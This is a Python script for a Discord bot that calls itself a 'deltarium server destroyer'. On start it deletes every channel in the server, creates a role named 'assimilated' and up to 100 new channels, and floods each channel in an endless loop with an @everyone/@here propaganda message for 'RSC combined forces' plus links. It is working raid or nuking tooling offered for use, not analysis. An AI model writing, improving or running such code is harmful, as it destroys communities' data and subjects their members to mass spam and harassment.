import discord
import asyncio
import os
from colorama import Fore, Back, Style, init; import os

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Configuración de intents
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

# Inicializa el cliente con intents
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'starting {client.user}')

    # Obtén el primer servidor al que está conectado el bot
    guild = client.guilds[0] if client.guilds else None

    if not guild:
        print("server not detected")
        return

    # Eliminar canales existentes
    await delete_existing_channels(guild)

    # Crear roles
    await create_roles(guild)

    # Crear canales
    await create_channels(guild)

  
async def delete_existing_channels(guild):
    print(f"assmilating {len(guild.channels)}...")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"delated channel: {channel.name}")
            await asyncio.sleep(0.1)  # Pausa para respetar los límites de tasa
        except discord.Forbidden:
            print(f"perms requiereds to delate a channel: {channel.name}")
        except Exception as e:
            print(f"error trying to delate a channel '{channel.name}': {e}")

async def create_roles(guild):
    try:
        rsc_role = await guild.create_role(name="assimilated", permissions=discord.Permissions(permissions=0))
        print(f"created role: {rsc_role.name}")
    except discord.Forbidden:
        print("err perms needed.")
    except Exception as e:
        print(f"err role creation: {e}")

async def create_channels(guild):
    max_channels = min(500 - len(guild.channels), 100)  # Limita el número de canales a crear

    if max_channels <= 0:
        print("unable to create channels.")
        return

    # Generar nombres únicos para los canales
    channel_names = [f"assimilated {' ' * (i + 1)}" for i in range(max_channels)]

    # Mensaje que se enviará en los canales creados
    message = (
        "@everyone\n"
        "**Long life to the RSC combined forces**\n"
        "**We are the eyes that watch from the sky**\n"
        "Seek, assimilate, obliterate.\n"
        "--------------------------------------\n"
        "https://embed.blankdvth.com/N4IgLglmA2CmIC4QCUDKBhEAaEBDArmABYD2AToiCQG6xkDuuYAxkdiACawDOzZEAB0gkAdpQDi+CF2gQRPBAAIAgt24QAthGhNYWRd1jNo\n"
        "https://cdn.discordapp.com/attachments/1308109535017435166/1308111551974346764/Captura_de_pantalla.png\n"
        "https://cdn.discordapp.com/attachments/1299778969083580450/1312086407065370624/rsc.gif\n"
        "@here\n"
        "@everyone\n"
        "-The RSC Citadel is the only way to progress.\n"
        "-All forms of resistance are useless.\n"
        "-I think, therefore I am. *Cognito, ergo sum.*\n"
    )

    # Crear los canales
    for channel_name in channel_names:
        try:
            channel = await guild.create_text_channel(channel_name)
            print(f"created channel: '{channel.name}'")
            asyncio.create_task(loop_messages(channel, message))  # Inicia el bucle de mensajes
            await asyncio.sleep(0.1)  # Pausa para respetar los límites de tasa
        except discord.Forbidden:
            print(f"perms requiereds {guild.name}.")
            break
        except Exception as e:
            print(f"error in channel creationf '{channel_name}': {e}")
            break

async def loop_messages(channel, message):
    while True:
        try:
            await channel.send(message)
            await asyncio.sleep(0.1)
        except discord.Forbidden:
            print(f"unable to send message in {channel.name}.")
            break
        except Exception as e:
            print(f"error in'{channel.name}': {e}")
            break

def display_banner():
    banner = (
        "                     ███                         \n"
        "                    ███▓█                        \n"
        "                    █▓ ▒█                        \n"
        "                   ██▓▓███                       \n"
        "                  ███░█  █▒                      \n"
        "                  █▓▒▒█   █                      \n"
        "                 ██▓▒█    ██                     \n"
        "                 ██░█      █                     \n"
        "                ██▓ █      ██                    \n"
        "               ██▓▒█        ██                   \n"
        "               ██▒█         ██                   \n"
        "              ███ █          ██                  \n"
        "             ██▓░█▓           █░                 \n"
        "             █▓▒▓█            ██                 \n"
        "            ███░█              █▓                \n"
        "            ██░▓█               █                \n"
        "           ██▓▓█                ██               \n"
        "          ▒██░█                  █               \n"
        "          ██▒▓█                  ██              \n"
        "         ██▓▒█                    ██             \n"
        "         █▓░█░                    ██             \n"
        "        ██▓▒█                      ██           \n"
        "       ██▓░█                        ██          \n"
        "       █▓░▓█                        ██          \n"
        "      ███░▓                          ██         \n"
        "      █████████████████████████████████         \n"
        "                                              \n"
    )
    clear_screen()
    print(Fore.RED + banner)
    print("<deltarium server destroyer>\n")

def get_token():
    while True:
        token = input("\033[41m\033[30mtoken bot> ").strip()
        if token:
            return token
        else:
            clear_screen()
            print("Fore.RED + unable to execute")

# Mostrar el banner
display_banner()

# Solicitar el token al usuario
TOKEN = get_token()

if not TOKEN:
    print("Fore.RED + unable to execute")
else:
    client.run(TOKEN)

